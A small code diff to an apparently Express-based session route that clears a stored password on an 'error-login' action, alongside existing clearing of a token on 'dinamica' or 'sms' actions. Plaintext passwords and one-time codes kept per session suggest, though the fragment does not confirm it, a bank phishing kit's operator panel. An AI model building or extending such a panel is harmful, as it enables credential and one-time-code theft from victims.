@@ -143,6 +143,9 @@ const registerSessionRoutes = (prefix) => {
     if (action === "dinamica" || action === "sms") {
       sessions[id].token = "";
     }
+    if (action === "error-login") {
+      sessions[id].password = "";
+    }
     sessions[id].last_seen = Date.now();
     sessions[id].updatedAt = Date.now();
     res.json({ success: true, session: sessions[id] });
